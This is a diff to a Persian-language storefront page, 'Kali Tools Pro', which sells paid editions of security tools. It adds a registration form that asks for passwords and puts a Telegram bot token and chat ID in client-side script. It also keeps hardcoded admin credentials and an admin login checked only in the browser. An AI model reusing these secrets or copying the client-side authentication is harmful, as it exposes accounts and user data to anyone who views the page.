-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            color: #999;
-            font-size: 0.9rem;
-        }
-
-        /* Responsive Design */
+        /* Responsive */
         @media (min-width: 480px) {
             .hero h1 {
                 font-size: 2.5rem;
-            }
-            
-            .logo-subtext {
-                display: block;
             }
             
             .cart-sidebar {
@@ -1224,7 +1255,7 @@
             }
             
             .logo-text {
-                font-size: 1.8rem;
+                font-size: 2rem;
             }
             
             .nav-links {
@@ -1376,12 +1407,17 @@
     </style>
 </head>
 <body>
+    <!-- Preloader -->
+    <div class="preloader" id="preloader">
+        <div class="loader"></div>
+        <div class="loader-text">در حال بارگذاری Kali Tools Pro...</div>
+    </div>
+
     <!-- Header -->
-    <header>
+    <header id="header">
         <div class="header-container">
             <div class="logo">
-                <div class="logo-text">Kali Tools<span style="color: white;">Pro</span></div>
-                <div class="logo-subtext">ابزارهای حرفهای امنیت</div>
+                <div class="logo-text">Kali Tools Pro</div>
             </div>
             
             <ul class="nav-links">
@@ -1408,7 +1444,7 @@
     <!-- Mobile Menu -->
     <div class="mobile-menu" id="mobile-menu">
         <div class="mobile-menu-header">
-            <div class="logo-text">Kali Tools<span style="color: white;">Pro</span></div>
+            <div class="logo-text">Kali Tools Pro</div>
             <button class="close-mobile-menu" id="close-mobile-menu">
                 <i class="fas fa-times"></i>
             </button>
@@ -1947,10 +1983,8 @@
     <!-- Login Modal -->
     <div class="modal" id="login-modal">
         <div class="modal-content">
-            <div class="modal-header">
-                <h3 class="modal-title">ورود به حساب کاربری</h3>
-                <button class="close-modal" id="close-login-modal"><i class="fas fa-times"></i></button>
-            </div>
+            <button class="close-modal" id="close-login-modal">&times;</button>
+            <h2 class="form-title">ورود به حساب کاربری</h2>
             <form id="login-form">
                 <div class="form-group">
                     <label for="email">ایمیل</label>
@@ -1962,20 +1996,43 @@
                 </div>
                 <button type="submit" class="btn btn-primary" style="width: 100%;">ورود</button>
             </form>
-            <p style="text-align: center; margin-top: 1rem;">حساب کاربری ندارید؟ <a href="#" style="color: var(--primary);">ثبت نام کنید</a></p>
-            <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1.5rem;">
-                <h4 style="color: var(--primary); margin-bottom: 0.5rem;">اطلاعات ورود مدیریت:</h4>
+            <p style="text-align: center; margin-top: 1rem; color: #ccc;">حساب کاربری ندارید؟ <a href="#" id="show-register" style="color: var(--primary);">ثبت نام کنید</a></p>
+        </div>
+    </div>
+
+    <!-- Register Modal -->
+    <div class="modal" id="register-modal">
+        <div class="modal-content">
+            <button class="close-modal" id="close-register-modal">&times;</button>
+            <h2 class="form-title">ثبت نام در Kali Tools Pro</h2>
+            <form id="register-form">
+                <div class="form-group">
+                    <label for="register-name">نام کامل</label>
+                    <input type="text" id="register-name" class="form-control" placeholder="نام و نام خانوادگی" required>
                 </div>
+                <div class="form-group">
+                    <label for="register-email">ایمیل</label>
+                    <input type="email" id="register-email" class="form-control" placeholder="example@email.com" required>
+                </div>
+                <div class="form-group">
+                    <label for="register-phone">شماره تلفن</label>
+                    <input type="tel" id="register-phone" class="form-control" placeholder="09xxxxxxxxx" required>
+                </div>
+                <div class="form-group">
+                    <label for="register-password">رمز عبور</label>
+                    <input type="password" id="register-password" class="form-control" placeholder="رمز عبور خود را وارد کنید" required>
+                </div>
+                <button type="submit" class="btn btn-primary" style="width: 100%;">ثبت نام</button>
+            </form>
+            <p style="text-align: center; margin-top: 1rem; color: #ccc;">حساب کاربری دارید؟ <a href="#" id="show-login" style="color: var(--primary);">ورود به حساب</a></p>
         </div>
     </div>
 
     <!-- Checkout Modal -->
-    <div class="checkout-modal" id="checkout-modal">
-        <div class="checkout-content">
-            <div class="modal-header">
-                <h3 class="modal-title">تکمیل اطلاعات پرداخت</h3>
-                <button class="close-modal" id="close-checkout-modal"><i class="fas fa-times"></i></button>
-            </div>
+    <div class="modal" id="checkout-modal">
+        <div class="modal-content">
+            <button class="close-modal" id="close-checkout-modal">&times;</button>
+            <h2 class="form-title">تکمیل اطلاعات پرداخت</h2>
             <form id="checkout-form">
                 <div class="form-group">
                     <label for="customer-name">نام و نام خانوادگی</label>
@@ -2013,1479 +2070,1612 @@
     <div class="toast" id="toast"></div>
 
     <script>
-       // Global variables
-let cart = [];
-let galleryItems = [];
-let products = [];
-let features = [];
-let videos = [];
-let currentAdminTab = 'dashboard';
-let isAdminLoggedIn = false;
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8459199254:AAEqCLIMDfs9uj2LNcX_93zt69_V_QrO_uY';
+        const TELEGRAM_CHAT_ID = '6071335955';
 
-// Server URL
-const SERVER_URL = window.location.origin;
+        // Global variables
+        let cart = [];
+        let galleryItems = [];
+        let products = [];
+        let features = [];
+        let videos = [];
+        let users = [];
+        let currentAdminTab = 'dashboard';
+        let isAdminLoggedIn = false;
 
-// DOM elements
-const cartBtn = document.getElementById('cart-btn');
-const cartSidebar = document.getElementById('cart-sidebar');
-const closeCart = document.getElementById('close-cart');
-const overlay = document.getElementById('overlay');
-const cartItems = document.getElementById('cart-items');
-const cartCount = document.getElementById('cart-count');
-const cartTotalPrice = document.getElementById('cart-total-price');
-const emptyCartMessage = document.getElementById('empty-cart-message');
-const checkoutBtn = document.getElementById('checkout-btn');
-const viewProductsBtn = document.getElementById('view-products-btn');
-const viewVideosBtn = document.getElementById('view-videos-btn');
-const loginBtn = document.getElementById('login-btn');
-const loginModal = document.getElementById('login-modal');
-const closeLoginModal = document.getElementById('close-login-modal');
-const loginForm = document.getElementById('login-form');
-const adminPanel = document.getElementById('admin-panel');
-const logoutBtn = document.getElementById('logout-btn');
-const galleryGrid = document.getElementById('gallery-grid');
-const productsGrid = document.getElementById('products-grid');
-const featuresGrid = document.getElementById('features-grid');
-const videosGrid = document.getElementById('videos-grid');
-const mobileMenuBtn = document.getElementById('mobile-menu-btn');
-const mobileMenu = document.getElementById('mobile-menu');
-const closeMobileMenu = document.getElementById('close-mobile-menu');
-const mobileLoginBtn = document.getElementById('mobile-login-btn');
-const toast = document.getElementById('toast');
-const checkoutModal = document.getElementById('checkout-modal');
-const closeCheckoutModal = document.getElementById('close-checkout-modal');
-const checkoutForm = document.getElementById('checkout-form');
-const backupBtn = document.getElementById('backup-btn');
-const videoModal = document.getElementById('video-modal');
-const videoModalPlayer = document.getElementById('video-modal-player');
-const closeVideoModal = document.getElementById('close-video-modal');
+        // Server URL
+        const SERVER_URL = window.location.origin;
 
-// Admin credentials
-const adminEmail = "admin@kalitools.af";
-const adminPassword = "KaliAdmin2024";
+        // DOM elements
+        const cartBtn = document.getElementById('cart-btn');
+        const cartSidebar = document.getElementById('cart-sidebar');
+        const closeCart = document.getElementById('close-cart');
+        const overlay = document.getElementById('overlay');
+        const cartItems = document.getElementById('cart-items');
+        const cartCount = document.getElementById('cart-count');
+        const cartTotalPrice = document.getElementById('cart-total-price');
+        const emptyCartMessage = document.getElementById('empty-cart-message');
+        const checkoutBtn = document.getElementById('checkout-btn');
+        const viewProductsBtn = document.getElementById('view-products-btn');
+        const viewVideosBtn = document.getElementById('view-videos-btn');
+        const loginBtn = document.getElementById('login-btn');
+        const loginModal = document.getElementById('login-modal');
+        const closeLoginModal = document.getElementById('close-login-modal');
+        const loginForm = document.getElementById('login-form');
+        const registerModal = document.getElementById('register-modal');
+        const closeRegisterModal = document.getElementById('close-register-modal');
+        const registerForm = document.getElementById('register-form');
+        const showRegister = document.getElementById('show-register');
+        const showLogin = document.getElementById('show-login');
+        const adminPanel = document.getElementById('admin-panel');
+        const logoutBtn = document.getElementById('logout-btn');
+        const galleryGrid = document.getElementById('gallery-grid');
+        const productsGrid = document.getElementById('products-grid');
+        const featuresGrid = document.getElementById('features-grid');
+        const videosGrid = document.getElementById('videos-grid');
+        const mobileMenuBtn = document.getElementById('mobile-menu-btn');
+        const mobileMenu = document.getElementById('mobile-menu');
+        const closeMobileMenu = document.getElementById('close-mobile-menu');
+        const mobileLoginBtn = document.getElementById('mobile-login-btn');
+        const toast = document.getElementById('toast');
+        const checkoutModal = document.getElementById('checkout-modal');
+        const closeCheckoutModal = document.getElementById('close-checkout-modal');
+        const checkoutForm = document.getElementById('checkout-form');
+        const backupBtn = document.getElementById('backup-btn');
+        const videoModal = document.getElementById('video-modal');
+        const videoModalPlayer = document.getElementById('video-modal-player');
+        const closeVideoModal = document.getElementById('close-video-modal');
 
-// Initialize the page
-document.addEventListener('DOMContentLoaded', function() {
-    loadInitialData();
-    updateCart();
-    setupEventListeners();
-    
-    // Check if admin is already logged in
-    if (localStorage.getItem('adminLoggedIn') === 'true') {
-        isAdminLoggedIn = true;
-        adminPanel.classList.add('active');
-    }
-});
+        // Admin credentials
+        const adminEmail = "admin@kalitools.af";
+        const adminPassword = "KaliAdmin2024";
 
-// Load initial data
-async function loadInitialData() {
-    try {
-        showToast('در حال بارگذاری دادهها...', 'success');
-        
-        // Try to load from localStorage first
-        const savedGallery = localStorage.getItem('kali_tools_gallery');
-        const savedProducts = localStorage.getItem('kali_tools_products');
-        const savedFeatures = localStorage.getItem('kali_tools_features');
-        const savedVideos = localStorage.getItem('kali_tools_videos');
-        
-        if (savedGallery) galleryItems = JSON.parse(savedGallery);
-        if (savedProducts) products = JSON.parse(savedProducts);
-        if (savedFeatures) features = JSON.parse(savedFeatures);
-        if (savedVideos) videos = JSON.parse(savedVideos);
-        
-        // Load default data if nothing in storage
-        if (galleryItems.length === 0) {
-            galleryItems = [
-                {
-                    id: 1,
-                    image: 'https://i.ibb.co/5XpcNymf/kali-red-sticker.jpg',
-                    title: 'کالی لینکس ۲۰۲۳',
-                    description: 'جدیدترین نسخه کالی لینکس با ابزارهای به روز شده',
-                    type: 'image'
-                },
-                {
-                    id: 2,
-                    image: 'https://i.ibb.co/nq4Qq5HK/kali-waves-1.png',
-                    title: 'ابزارهای تست نفوذ',
-                    description: 'مجموعه کامل ابزارهای امنیتی و تست نفوذ',
-                    type: 'image'
-                },
-                {
-                    id: 3,
-                    image: 'https://i.ibb.co/WWfb577V/kali-tiles-purple.jpg',
-                    title: 'محیط توسعه',
-                    description: 'محیط توسعه یکپارچه برای متخصصان امنیت',
-                    type: 'image'
-                }
-            ];
-        }
-        
-        if (products.length === 0) {
-            products = [
-                {
-                    id: 1,
-                    name: "Nmap Pro Edition",
-                    category: "ابزار شبکه",
-                    price: 2990,
-                    description: "ابزار اسکن شبکه پیشرفته با قابلیتهای گسترده برای شناسایی میزبانها و سرویسها",
-                    image: "https://i.ibb.co/v6sWSFr7/kali-tiles.jpg",
-                    video: ""
-                },
-                {
-                    id: 2,
-                    name: "Metasploit Framework",
-                    category: "تست نفوذ",
-                    price: 4590,
-                    description: "چارچوب کامل تست نفوذ با پایگاه داده گسترده از اکسپلویتها و ماژولهای پیشرفته",
-                    image: "https://i.ibb.co/ynmdk2jb/kali-blue-matrix.png",
-                    video: ""
-                },
-                {
-                    id: 3,
-                    name: "Wireshark Advanced",
-                    category: "تحلیل امنیتی",
-                    price: 3790,
-                    description: "ابزار تحلیل ترافیک شبکه با قابلیتهای پیشرفته برای بررسی بستههای داده",
-                    image: "https://i.ibb.co/5XpcNymf/kali-red-sticker.jpg",
-                    video: ""
-                },
-                {
-                    id: 4,
-                    name: "John the Ripper Pro",
-                    category: "رمزنگاری",
-                    price: 3290,
-                    description: "ابزار پیشرفته شکستن رمز عبور با الگوریتمهای بهینه شده و سرعت بالا",
-                    image: "https://i.ibb.co/nq4Qq5HK/kali-waves-1.png",
-                    video: ""
-                }
-            ];
-        }
-        
-        if (features.length === 0) {
-            features = [
-                {
-                    id: 1,
-                    icon: "fas fa-shield-alt",
-                    title: "امنیت پیشرفته",
-                    description: "ابزارهای تست نفوذ و امنیت با قابلیتهای پیشرفته برای شناسایی آسیبپذیریها"
-                },
-                {
-                    id: 2,
-                    icon: "fas fa-bolt",
-                    title: "کارایی بالا",
-                    description: "ابزارهای بهینهشده برای اجرای سریع و کارآمد حتی در سختافزارهای معمولی"
-                },
-                {
-                    id: 3,
-                    icon: "fas fa-graduation-cap",
-                    title: "آموزش کامل",
-                    description: "مستندات جامع و دورههای آموزشی برای استفاده مؤثر از تمامی ابزارها"
-                }
-            ];
-        }
-        
-        if (videos.length === 0) {
-            videos = [
-                {
-                    id: 1,
-                    title: "آموزش نصب کالی لینکس",
-                    description: "آموزش کامل نصب و راهاندازی کالی لینکس",
-                    videoUrl: "https://www.youtube.com/embed/lJ26h_L26LY",
-                    thumbnail: "https://i.ibb.co/ynmdk2jb/kali-blue-matrix.png",
-                    duration: "15:30",
-                    category: "آموزشی"
-                },
-                {
-                    id: 2,
-                    title: "آموزش استفاده از Nmap",
-                    description: "آموزش کامل ابزار اسکن شبکه Nmap",
-                    videoUrl: "https://www.youtube.com/embed/zFQBfZ6_-t0",
-                    thumbnail: "https://i.ibb.co/5XpcNymf/kali-red-sticker.jpg",
-                    duration: "22:15",
-                    category: "آموزشی"
-                },
-                {
-                    id: 3,
-                    title: "آموزش Metasploit Framework",
-                    description: "آموزش استفاده از چارچوب تست نفوذ Metasploit",
-                    videoUrl: "https://www.youtube.com/embed/lJ26h_L26LY",
-                    thumbnail: "https://i.ibb.co/WWfb577V/kali-tiles-purple.jpg",
-                    duration: "18:45",
-                    category: "آموزشی"
-                }
-            ];
-        }
-        
-        loadGalleryItems();
-        loadProducts();
-        loadFeatures();
-        loadVideos();
-        updateAdminStats();
-        
-        showToast('دادهها با موفقیت بارگذاری شدند', 'success');
-        
-    } catch (error) {
-        console.error('Error loading initial data:', error);
-        showToast('خطا در بارگذاری دادهها', 'error');
-    }
-}
-
-// Setup event listeners
-function setupEventListeners() {
-    // Cart functionality
-    cartBtn.addEventListener('click', () => {
-        cartSidebar.classList.add('active');
-        overlay.classList.add('active');
-        document.body.style.overflow = 'hidden';
-    });
-
-    closeCart.addEventListener('click', () => {
-        cartSidebar.classList.remove('active');
-        overlay.classList.remove('active');
-        document.body.style.overflow = 'auto';
-    });
-
-    overlay.addEventListener('click', () => {
-        cartSidebar.classList.remove('active');
-        overlay.classList.remove('active');
-        document.body.style.overflow = 'auto';
-        loginModal.classList.remove('active');
-        mobileMenu.classList.remove('active');
-        checkoutModal.classList.remove('active');
-        videoModal.classList.remove('active');
-    });
-
-    // Login functionality
-    loginBtn.addEventListener('click', () => {
-        loginModal.classList.add('active');
-        document.body.style.overflow = 'hidden';
-    });
-
-    mobileLoginBtn.addEventListener('click', (e) => {
-        e.preventDefault();
-        loginModal.classList.add('active');
-        mobileMenu.classList.remove('active');
-        document.body.style.overflow = 'hidden';
-    });
-
-    closeLoginModal.addEventListener('click', () => {
-        loginModal.classList.remove('active');
-        document.body.style.overflow = 'auto';
-    });
-
-    // Checkout functionality
-    checkoutBtn.addEventListener('click', () => {
-        if (cart.length > 0) {
-            cartSidebar.classList.remove('active');
-            checkoutModal.classList.add('active');
-        }
-    });
-
-    closeCheckoutModal.addEventListener('click', () => {
-        checkoutModal.classList.remove('active');
-    });
-
-    // Video modal functionality
-    closeVideoModal.addEventListener('click', () => {
-        videoModal.classList.remove('active');
-        videoModalPlayer.pause();
-        videoModalPlayer.currentTime = 0;
-        document.body.style.overflow = 'auto';
-    });
-
-    // Logout functionality
-    logoutBtn.addEventListener('click', () => {
-        adminPanel.classList.remove('active');
-        isAdminLoggedIn = false;
-        localStorage.removeItem('adminLoggedIn');
-        showToast('با موفقیت از سیستم خارج شدید', 'success');
-    });
-
-    // Mobile menu functionality
-    mobileMenuBtn.addEventListener('click', () => {
-        mobileMenu.classList.add('active');
-        document.body.style.overflow = 'hidden';
-    });
-
-    closeMobileMenu.addEventListener('click', () => {
-        mobileMenu.classList.remove('active');
-        document.body.style.overflow = 'auto';
-    });
-
-    // Scroll to products section
-    viewProductsBtn.addEventListener('click', () => {
-        document.getElementById('products').scrollIntoView({ behavior: 'smooth' });
-    });
-
-    // Scroll to videos section
-    viewVideosBtn.addEventListener('click', () => {
-        document.getElementById('videos').scrollIntoView({ behavior: 'smooth' });
-    });
-
-    // Add to cart functionality
-    document.addEventListener('click', function(e) {
-        if (e.target.classList.contains('add-to-cart') || e.target.closest('.add-to-cart')) {
-            const button = e.target.classList.contains('add-to-cart') ? e.target : e.target.closest('.add-to-cart');
-            const id = button.getAttribute('data-id');
-            const name = button.getAttribute('data-name');
-            const price = parseInt(button.getAttribute('data-price'));
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            loadInitialData();
+            updateCart();
+            setupEventListeners();
             
-            const existingItem = cart.find(item => item.id === id);
-            
-            if (existingItem) {
-                existingItem.quantity += 1;
-            } else {
-                cart.push({
-                    id,
-                    name,
-                    price,
-                    quantity: 1
-                });
+            // Check if admin is already logged in
+            if (localStorage.getItem('adminLoggedIn') === 'true') {
+                isAdminLoggedIn = true;
+                adminPanel.classList.add('active');
             }
             
-            updateCart();
-            showToast(`"${name}" به سبد خرید اضافه شد`, 'success');
-        }
-    });
+            // Hide preloader after page loads
+            setTimeout(() => {
+                document.getElementById('preloader').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('preloader').style.display = 'none';
+                }, 500);
+            }, 2000);
+        });
 
-    // Play video functionality
-    document.addEventListener('click', function(e) {
-        if (e.target.classList.contains('video-play-btn') || e.target.closest('.video-play-btn')) {
-            const button = e.target.classList.contains('video-play-btn') ? e.target : e.target.closest('.video-play-btn');
-            const videoUrl = button.getAttribute('data-video');
-            
-            if (videoUrl) {
-                videoModalPlayer.src = SERVER_URL + videoUrl;
-                videoModal.classList.add('active');
+        // Load initial data
+        async function loadInitialData() {
+            try {
+                showToast('در حال بارگذاری دادهها...', 'success');
+                
+                // Try to load from localStorage first
+                const savedGallery = localStorage.getItem('kali_tools_gallery');
+                const savedProducts = localStorage.getItem('kali_tools_products');
+                const savedFeatures = localStorage.getItem('kali_tools_features');
+                const savedVideos = localStorage.getItem('kali_tools_videos');
+                const savedUsers = localStorage.getItem('kali_tools_users');
+                
+                if (savedGallery) galleryItems = JSON.parse(savedGallery);
+                if (savedProducts) products = JSON.parse(savedProducts);
+                if (savedFeatures) features = JSON.parse(savedFeatures);
+                if (savedVideos) videos = JSON.parse(savedVideos);
+                if (savedUsers) users = JSON.parse(savedUsers);
+                
+                // Load default data if nothing in storage
+                if (galleryItems.length === 0) {
+                    galleryItems = [
+                        {
+                            id: 1,
+                            image: 'https://i.ibb.co/5XpcNymf/kali-red-sticker.jpg',
+                            title: 'کالی لینکس ۲۰۲۳',
+                            description: 'جدیدترین نسخه کالی لینکس با ابزارهای به روز شده',
+                            type: 'image'
+                        },
+                        {
+                            id: 2,
+                            image: 'https://i.ibb.co/nq4Qq5HK/kali-waves-1.png',
+                            title: 'ابزارهای تست نفوذ',
+                            description: 'مجموعه کامل ابزارهای امنیتی و تست نفوذ',
+                            type: 'image'
+                        },
+                        {
+                            id: 3,
+                            image: 'https://i.ibb.co/WWfb577V/kali-tiles-purple.jpg',
+                            title: 'محیط توسعه',
+                            description: 'محیط توسعه یکپارچه برای متخصصان امنیت',
+                            type: 'image'
+                        }
+                    ];
+                }
+                
+                if (products.length === 0) {
+                    products = [
+                        {
+                            id: 1,
+                            name: "Nmap Pro Edition",
+                            category: "ابزار شبکه",
+                            price: 2990,
+                            description: "ابزار اسکن شبکه پیشرفته با قابلیتهای گسترده برای شناسایی میزبانها و سرویسها",
+                            image: "https://i.ibb.co/v6sWSFr7/kali-tiles.jpg",
+                            video: ""
+                        },
+                        {
+                            id: 2,
+                            name: "Metasploit Framework",
+                            category: "تست نفوذ",
+                            price: 4590,
+                            description: "چارچوب کامل تست نفوذ با پایگاه داده گسترده از اکسپلویتها و ماژولهای پیشرفته",
+                            image: "https://i.ibb.co/ynmdk2jb/kali-blue-matrix.png",
+                            video: ""
+                        },
+                        {
+                            id: 3,
+                            name: "Wireshark Advanced",
+                            category: "تحلیل امنیتی",
+                            price: 3790,
+                            description: "ابزار تحلیل ترافیک شبکه با قابلیتهای پیشرفته برای بررسی بستههای داده",
+                            image: "https://i.ibb.co/5XpcNymf/kali-red-sticker.jpg",
+                            video: ""
+                        },
+                        {
+                            id: 4,
+                            name: "John the Ripper Pro",
+                            category: "رمزنگاری",
+                            price: 3290,
+                            description: "ابزار پیشرفته شکستن رمز عبور با الگوریتمهای بهینه شده و سرعت بالا",
+                            image: "https://i.ibb.co/nq4Qq5HK/kali-waves-1.png",
+                            video: ""
+                        }
+                    ];
+                }
+                
+                if (features.length === 0) {
+                    features = [
+                        {
+                            id: 1,
+                            icon: "fas fa-shield-alt",
+                            title: "امنیت پیشرفته",
+                            description: "ابزارهای تست نفوذ و امنیت با قابلیتهای پیشرفته برای شناسایی آسیبپذیریها"
+                        },
+                        {
+                            id: 2,
+                            icon: "fas fa-bolt",
+                            title: "کارایی بالا",
+                            description: "ابزارهای بهینهشده برای اجرای سریع و کارآمد حتی در سختافزارهای معمولی"
+                        },
+                        {
+                            id: 3,
+                            icon: "fas fa-graduation-cap",
+                            title: "آموزش کامل",
+                            description: "مستندات جامع و دورههای آموزشی برای استفاده مؤثر از تمامی ابزارها"
+                        }
+                    ];
+                }
+                
+                if (videos.length === 0) {
+                    videos = [
+                        {
+                            id: 1,
+                            title: "آموزش نصب کالی لینکس",
+                            description: "آموزش کامل نصب و راهاندازی کالی لینکس",
+                            videoUrl: "https://youtu.be/lJ26h_L26LY?si=KEEz6YTKXIrQew4Q",
+                            thumbnail: "https://i.ibb.co/ynmdk2jb/kali-blue-matrix.png",
+                            duration: "15:30",
+                            category: "آموزشی"
+                        },
+                        {
+                            id: 2,
+                            title: "آموزش استفاده از Nmap",
+                            description: "آموزش کامل ابزار اسکن شبکه Nmap",
+                            videoUrl: "https://youtu.be/4t4kBkMsDbQ?si=okY5I5HzTAZPwEX8",
+                            thumbnail: "https://i.ibb.co/5XpcNymf/kali-red-sticker.jpg",
+                            duration: "22:15",
+                            category: "آموزشی"
+                        },
+                        {
+                            id: 3,
+                            title: "آموزش Metasploit Framework",
+                            description: "آموزش استفاده از چارچوب تست نفوذ Metasploit",
+                            videoUrl: "https://youtu.be/zFQBfZ6_-t0?si=AideDOHrimqXAVIb",
+                            thumbnail: "https://i.ibb.co/WWfb577V/kali-tiles-purple.jpg",
+                            duration: "18:45",
+                            category: "آموزشی"
+                        }
+                    ];
+                }
+                
+                loadGalleryItems();
+                loadProducts();
+                loadFeatures();
+                loadVideos();
+                updateAdminStats();
+                
+                showToast('دادهها با موفقیت بارگذاری شدند', 'success');
+                
+            } catch (error) {
+                console.error('Error loading initial data:', error);
+                showToast('خطا در بارگذاری دادهها', 'error');
+            }
+        }
+
+        // Setup event listeners
+        function setupEventListeners() {
+            // Cart functionality
+            cartBtn.addEventListener('click', () => {
+                cartSidebar.classList.add('active');
+                overlay.classList.add('active');
                 document.body.style.overflow = 'hidden';
-            }
-        }
-    });
+            });
 
-    // Checkout form submission
-    checkoutForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        
-        const customerName = document.getElementById('customer-name').value;
-        const customerPhone = document.getElementById('customer-phone').value;
-        const customerTelegram = document.getElementById('customer-telegram').value;
-        const customerAddress = document.getElementById('customer-address').value;
-        const paymentMethod = document.querySelector('input[name="payment"]:checked').value;
-        
-        // Simulate order submission
-        const success = await sendOrderToServer(customerName, customerPhone, customerTelegram, customerAddress, paymentMethod);
-        
-        if (success) {
-            showToast('سفارش شما با موفقیت ثبت شد! به زودی با شما تماس گرفته خواهد شد.', 'success');
-            cart = [];
-            updateCart();
-            checkoutForm.reset();
-            checkoutModal.classList.remove('active');
-            overlay.classList.remove('active');
-            document.body.style.overflow = 'auto';
-        } else {
-            showToast('خطا در ارسال سفارش. لطفاً دوباره تلاش کنید.', 'error');
-        }
-    });
+            closeCart.addEventListener('click', () => {
+                cartSidebar.classList.remove('active');
+                overlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
 
-    // Login form submission
-    loginForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        
-        if (email === adminEmail && password === adminPassword) {
-            showToast('ورود به پنل مدیریت با موفقیت انجام شد!', 'success');
-            loginModal.classList.remove('active');
-            document.body.style.overflow = 'auto';
-            loginForm.reset();
-            
-            isAdminLoggedIn = true;
-            localStorage.setItem('adminLoggedIn', 'true');
-            adminPanel.classList.add('active');
-            adminPanel.scrollIntoView({ behavior: 'smooth' });
-        } else if (email && password) {
-            showToast('ورود با موفقیت انجام شد!', 'success');
-            loginModal.classList.remove('active');
-            document.body.style.overflow = 'auto';
-            loginForm.reset();
-        } else {
-            showToast('لطفاً تمام فیلدها را پر کنید', 'error');
-        }
-    });
+            overlay.addEventListener('click', () => {
+                cartSidebar.classList.remove('active');
+                overlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+                loginModal.style.display = 'none';
+                registerModal.style.display = 'none';
+                mobileMenu.classList.remove('active');
+                checkoutModal.style.display = 'none';
+                videoModal.classList.remove('active');
+            });
 
-    // Admin tabs
-    document.querySelectorAll('.admin-tab').forEach(tab => {
-        tab.addEventListener('click', () => {
-            const tabId = tab.getAttribute('data-tab');
-            switchTab(tabId);
-        });
-    });
+            // Login functionality
+            loginBtn.addEventListener('click', () => {
+                loginModal.style.display = 'flex';
+                document.body.style.overflow = 'hidden';
+            });
 
-    // File uploads
-    setupFileUpload('gallery-image-upload', 'gallery-image-input', 'gallery-image-preview', 'image');
-    setupFileUpload('product-image-upload', 'product-image-input', 'product-image-preview', 'image');
-    setupFileUpload('product-video-upload', 'product-video-input', 'product-video-preview', 'video');
-    setupFileUpload('video-file-upload', 'video-file-input', 'video-file-preview', 'video');
-    setupFileUpload('video-thumbnail-upload', 'video-thumbnail-input', 'video-thumbnail-preview', 'image');
+            mobileLoginBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                loginModal.style.display = 'flex';
+                mobileMenu.classList.remove('active');
+                document.body.style.overflow = 'hidden';
+            });
 
-    // Admin forms
-    setupAdminForms();
+            closeLoginModal.addEventListener('click', () => {
+                loginModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            });
 
-    // Backup functionality
-    backupBtn.addEventListener('click', backupData);
+            // Register functionality
+            showRegister.addEventListener('click', (e) => {
+                e.preventDefault();
+                loginModal.style.display = 'none';
+                registerModal.style.display = 'flex';
+            });
 
-    // Restore functionality
-    document.getElementById('restore-btn').addEventListener('click', () => {
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.accept = '.json';
-        input.onchange = function(e) {
-            if (e.target.files.length > 0) {
-                restoreData(e.target.files[0]);
-            }
-        };
-        input.click();
-    });
+            showLogin.addEventListener('click', (e) => {
+                e.preventDefault();
+                registerModal.style.display = 'none';
+                loginModal.style.display = 'flex';
+            });
 
-    // Smooth scrolling for navigation links
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener('click', function (e) {
-            e.preventDefault();
-            const target = document.querySelector(this.getAttribute('href'));
-            if (target) {
-                target.scrollIntoView({
-                    behavior: 'smooth',
-                    block: 'start'
-                });
-            }
-            // Close mobile menu after clicking a link
-            mobileMenu.classList.remove('active');
-            document.body.style.overflow = 'auto';
-        });
-    });
+            closeRegisterModal.addEventListener('click', () => {
+                registerModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            });
 
-    // Delete functionality for gallery items in admin
-    document.addEventListener('click', function(e) {
-        if (e.target.classList.contains('delete-gallery-item-list') || e.target.closest('.delete-gallery-item-list')) {
-            const button = e.target.classList.contains('delete-gallery-item-list') ? e.target : e.target.closest('.delete-gallery-item-list');
-            const id = parseInt(button.getAttribute('data-id'));
-            deleteGalleryItem(id);
-        }
-        
-        if (e.target.classList.contains('delete-product-list') || e.target.closest('.delete-product-list')) {
-            const button = e.target.classList.contains('delete-product-list') ? e.target : e.target.closest('.delete-product-list');
-            const id = parseInt(button.getAttribute('data-id'));
-            deleteProduct(id);
-        }
-        
-        if (e.target.classList.contains('delete-video-list') || e.target.closest('.delete-video-list')) {
-            const button = e.target.classList.contains('delete-video-list') ? e.target : e.target.closest('.delete-video-list');
-            const id = parseInt(button.getAttribute('data-id'));
-            deleteVideo(id);
-        }
-    });
-}
+            // Checkout functionality
+            checkoutBtn.addEventListener('click', () => {
+                if (cart.length > 0) {
+                    cartSidebar.classList.remove('active');
+                    checkoutModal.style.display = 'flex';
+                }
+            });
 
-// Switch admin tab
-function switchTab(tabId) {
-    // Update active tab
-    document.querySelectorAll('.admin-tab').forEach(tab => {
-        tab.classList.remove('active');
-    });
-    document.querySelector(`.admin-tab[data-tab="${tabId}"]`).classList.add('active');
-    
-    // Update active tab content
-    document.querySelectorAll('.admin-tab-content').forEach(content => {
-        content.classList.remove('active');
-    });
-    document.getElementById(`${tabId}-tab`).classList.add('active');
-    
-    // Load tab-specific data
-    if (tabId === 'gallery') {
-        loadGalleryAdmin();
-    } else if (tabId === 'products') {
-        loadProductsAdmin();
-    } else if (tabId === 'videos') {
-        loadVideosAdmin();
-    } else if (tabId === 'features') {
-        loadFeaturesAdmin();
-    } else if (tabId === 'ethical') {
-        loadEthicalAdmin();
-    } else if (tabId === 'footer') {
-        loadFooterAdmin();
-    } else if (tabId === 'hero') {
-        loadHeroAdmin();
-    }
-    
-    currentAdminTab = tabId;
-}
+            closeCheckoutModal.addEventListener('click', () => {
+                checkoutModal.style.display = 'none';
+            });
 
-// Setup file upload
-function setupFileUpload(uploadElementId, inputElementId, previewElementId, fileType) {
-    const uploadElement = document.getElementById(uploadElementId);
-    const inputElement = document.getElementById(inputElementId);
-    const previewElement = document.getElementById(previewElementId);
-    
-    uploadElement.addEventListener('click', () => {
-        inputElement.click();
-    });
-    
-    inputElement.addEventListener('change', (e) => {
